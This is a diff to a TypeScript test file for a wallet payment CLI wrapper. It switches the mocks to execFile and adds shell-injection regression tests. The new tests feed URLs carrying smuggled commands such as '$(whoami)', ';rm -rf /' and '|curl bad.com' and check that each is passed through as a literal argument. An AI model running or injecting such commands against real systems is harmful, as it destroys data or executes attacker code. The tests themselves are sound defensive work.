@@ -1,11 +1,17 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 
 // vi.hoisted ensures this runs before vi.mock
-const mockExecAsync = vi.hoisted(() => vi.fn());
+const mockExecFileAsync = vi.hoisted(() => vi.fn());
 
-// Mock util.promisify to return our controllable mock
+// Mock child_process.execFile via util.promisify
 vi.mock('util', () => ({
-  promisify: () => mockExecAsync,
+  promisify: (fn: unknown) => {
+    // Return our mock for execFile, passthrough for others
+    if (fn && (fn as { name?: string }).name === 'execFile') {
+      return mockExecFileAsync;
+    }
+    return mockExecFileAsync; // Default to mock for exec too
+  },
 }));
 
 // Import after mocking
@@ -52,7 +58,7 @@ describe('awal', () => {
 
   describe('checkAwalStatus', () => {
     it('returns authenticated status when awal is available', async () => {
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ authenticated: true, address: '0x1234' }),
         stderr: '',
       });
@@ -65,7 +71,7 @@ describe('awal', () => {
     });
 
     it('handles loggedIn field as alternative to authenticated', async () => {
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ loggedIn: true, walletAddress: '0xabcd' }),
         stderr: '',
       });
@@ -78,7 +84,7 @@ describe('awal', () => {
     });
 
     it('handles awal not found', async () => {
-      mockExecAsync.mockRejectedValueOnce(new Error('command not found'));
+      mockExecFileAsync.mockRejectedValueOnce(new Error('command not found'));
 
       const status = await checkAwalStatus();
       
@@ -88,7 +94,7 @@ describe('awal', () => {
     });
 
     it('handles timeout', async () => {
-      mockExecAsync.mockRejectedValueOnce(new Error('timeout'));
+      mockExecFileAsync.mockRejectedValueOnce(new Error('timeout'));
 
       const status = await checkAwalStatus();
       
@@ -98,7 +104,7 @@ describe('awal', () => {
     });
 
     it('caches status results', async () => {
-      mockExecAsync.mockResolvedValue({
+      mockExecFileAsync.mockResolvedValue({
         stdout: JSON.stringify({ authenticated: true }),
         stderr: '',
       });
@@ -108,13 +114,13 @@ describe('awal', () => {
       await checkAwalStatus();
 
       // Should only call exec once due to caching
-      expect(mockExecAsync).toHaveBeenCalledTimes(1);
+      expect(mockExecFileAsync).toHaveBeenCalledTimes(1);
     });
   });
 
   describe('awalPay', () => {
     it('calls awal x402 pay with correct arguments', async () => {
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ 
           success: true, 
           body: { result: 'ok' },
@@ -133,17 +139,21 @@ describe('awal', () => {
       expect(result.body).toEqual({ result: 'ok' });
       expect(result.statusCode).toBe(200);
 
-      // Verify the command was constructed correctly
-      expect(mockExecAsync).toHaveBeenCalled();
-      const command = mockExecAsync.mock.calls[0][0];
-      expect(command).toContain('npx awal@latest x402 pay');
-      expect(command).toContain('https://example.com/api');
-      expect(command).toContain('-X POST');
-      expect(command).toContain('--json');
+      // Verify execFile was called with argument array (not string)
+      expect(mockExecFileAsync).toHaveBeenCalled();
+      const [command, args] = mockExecFileAsync.mock.calls[0];
+      expect(command).toBe('npx');
+      expect(args).toContain('awal@latest');
+      expect(args).toContain('x402');
+      expect(args).toContain('pay');
+      expect(args).toContain('https://example.com/api');
+      expect(args).toContain('-X');
+      expect(args).toContain('POST');
+      expect(args).toContain('--json');
     });
 
     it('handles payment errors from response', async () => {
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ 
           error: 'Insufficient balance',
           statusCode: 402,
@@ -158,7 +168,7 @@ describe('awal', () => {
     });
 
     it('handles data field as body alternative', async () => {
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ 
           data: { response: 'value' },
           statusCode: 200,
@@ -173,7 +183,7 @@ describe('awal', () => {
     });
 
     it('extracts payment details', async () => {
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ 
           body: { result: 'ok' },
           statusCode: 200,
@@ -195,7 +205,7 @@ describe('awal', () => {
     });
 
     it('handles txHash as transactionHash alternative', async () => {
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ 
           body: { result: 'ok' },
           txHash: '0xefgh',
@@ -212,7 +222,7 @@ describe('awal', () => {
     it('returns error from stderr on exec failure', async () => {
       const error = new Error('Command failed') as Error & { stderr?: string };
       error.stderr = 'awal: not authenticated';
-      mockExecAsync.mockRejectedValueOnce(error);
+      mockExecFileAsync.mockRejectedValueOnce(error);
 
       const result = await awalPay('https://example.com/api');
       expect(result.success).toBe(false);
@@ -222,7 +232,7 @@ describe('awal', () => {
     it('parses JSON error from stderr', async () => {
       const error = new Error('Command failed') as Error & { stderr?: string };
       error.stderr = JSON.stringify({ error: 'Wallet locked', code: 'WALLET_LOCKED' });
-      mockExecAsync.mockRejectedValueOnce(error);
+      mockExecFileAsync.mockRejectedValueOnce(error);
 
       const result = await awalPay('https://example.com/api');
       expect(result.success).toBe(false);
@@ -231,30 +241,134 @@ describe('awal', () => {
 
     it('throws AwalPaymentError on unexpected failures without stderr', async () => {
       const error = new Error('Network error');
-      mockExecAsync.mockRejectedValueOnce(error);
+      mockExecFileAsync.mockRejectedValueOnce(error);
 
       await expect(awalPay('https://example.com/api')).rejects.toThrow(AwalPaymentError);
     });
 
     it('throws AwalPaymentError on JSON parse failure', async () => {
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: 'not valid json',
         stderr: '',
       });
 
       await expect(awalPay('https://example.com/api')).rejects.toThrow(AwalPaymentError);
     });
+
+    it('handles empty stdout', async () => {
+      mockExecFileAsync.mockResolvedValueOnce({
+        stdout: '',
+        stderr: 'some error',
+      });
+
+      const result = await awalPay('https://example.com/api');
+      expect(result.success).toBe(false);
+      expect(result.error).toBe('some error');
+    });
+
+    it('handles empty stdout with no stderr', async () => {
+      mockExecFileAsync.mockResolvedValueOnce({
+        stdout: '   ',
+        stderr: '',
+      });
+
+      const result = await awalPay('https://example.com/api');
+      expect(result.success).toBe(false);
+      expect(result.error).toBe('Empty response from awal');
+    });
+  });
+
+  describe('security: shell injection prevention', () => {
+    it('safely handles URLs with command substitution $()', async () => {
+      mockExecFileAsync.mockResolvedValueOnce({
+        stdout: JSON.stringify({ body: 'ok' }),
+        stderr: '',
+      });
+
+      await awalPay('https://evil.com/$(whoami)');
+
+      // Verify the URL was passed as a literal argument, not interpreted
+      const [, args] = mockExecFileAsync.mock.calls[0];
+      expect(args).toContain('https://evil.com/$(whoami)');
+    });
+
+    it('safely handles URLs with backticks', async () => {
+      mockExecFileAsync.mockResolvedValueOnce({
+        stdout: JSON.stringify({ body: 'ok' }),
+        stderr: '',
+      });
+
+      await awalPay('https://evil.com/`id`');
+
+      const [, args] = mockExecFileAsync.mock.calls[0];
+      expect(args).toContain('https://evil.com/`id`');
+    });
+
+    it('safely handles URLs with semicolons', async () => {
+      mockExecFileAsync.mockResolvedValueOnce({
+        stdout: JSON.stringify({ body: 'ok' }),
+        stderr: '',
+      });
+
+      await awalPay('https://evil.com/;rm -rf /');
+
+      const [, args] = mockExecFileAsync.mock.calls[0];
+      expect(args).toContain('https://evil.com/;rm -rf /');
+    });
+
+    it('safely handles URLs with pipes', async () => {
+      mockExecFileAsync.mockResolvedValueOnce({
+        stdout: JSON.stringify({ body: 'ok' }),
+        stderr: '',
+      });
+
+      await awalPay('https://evil.com/|curl bad.com');
+
+      const [, args] = mockExecFileAsync.mock.calls[0];
+      expect(args).toContain('https://evil.com/|curl bad.com');
+    });
+
+    it('safely handles body with shell metacharacters', async () => {
+      mockExecFileAsync.mockResolvedValueOnce({
+        stdout: JSON.stringify({ body: 'ok' }),
+        stderr: '',
+      });
+
+      await awalPay('https://api.com', {
+        method: 'POST',
+        body: '{"cmd": "$(whoami)"}',
+      });
+
+      const [, args] = mockExecFileAsync.mock.calls[0];
+      expect(args).toContain('{"cmd": "$(whoami)"}');
+    });
+
+    it('uses execFile not exec (no shell)', async () => {
+      mockExecFileAsync.mockResolvedValueOnce({
+        stdout: JSON.stringify({ body: 'ok' }),
+        stderr: '',
+      });
+
+      await awalPay('https://example.com');
+
+      // Verify we called with 'npx' as command and array of args
+      expect(mockExecFileAsync).toHaveBeenCalledWith(
+        'npx',
+        expect.arrayContaining(['awal@latest', 'x402', 'pay']),
+        expect.any(Object)
+      );
+    });
   });
 
   describe('clearAwalCache', () => {
     it('clears the cached status', async () => {
       // First call returns authenticated
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ authenticated: true }),
         stderr: '',
       });
       // Second call returns not authenticated
-      mockExecAsync.mockResolvedValueOnce({
+      mockExecFileAsync.mockResolvedValueOnce({
         stdout: JSON.stringify({ authenticated: false }),
         stderr: '',
       });
@@ -266,7 +380,7 @@ describe('awal', () => {
 
       const status2 = await checkAwalStatus();
       expect(status2.authenticated).toBe(false);
-      expect(mockExecAsync).toHaveBeenCalledTimes(2);
+      expect(mockExecFileAsync).toHaveBeenCalledTimes(2);
     });
   });
 });
